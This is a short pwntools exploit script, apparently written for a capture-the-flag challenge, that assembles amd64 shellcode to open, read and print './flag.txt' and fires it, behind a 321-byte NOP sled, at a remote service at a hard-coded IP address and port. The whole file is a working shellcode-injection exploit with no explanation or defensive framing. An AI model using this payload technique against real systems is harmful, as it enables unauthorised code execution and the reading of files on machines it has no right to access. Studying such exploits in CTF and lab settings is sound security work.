from pwn import *
import time

context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('source')
# lib = e.libc


shellcode =shellcraft.pushstr("./flag.txt")

shellcode += '''
    mov rdi, rsp
    mov rdx, 0
    mov rsi, 0
    mov rax, 2
    syscall
'''

shellcode+='''
    mov rdi, rax
    mov rdx, 0x100
    mov rsi, 0xaabb0300
    mov rax, 0
    syscall
    nop
'''

shellcode+='''
    mov rdi, 1
    mov rdx, 0x100
    mov rsi, 0xaabb0300
    /* call write() */
    mov rax, 1
    syscall

'''

shellcode =asm(shellcode)
info("shellcode: %s" % shellcode)
info(len(shellcode))
r= e.process()
r = remote("34.126.117.161",3000)
# time.sleep(1)

payload = b"\x90"*321+shellcode
pause()
r.sendline(payload)
r.interactive()

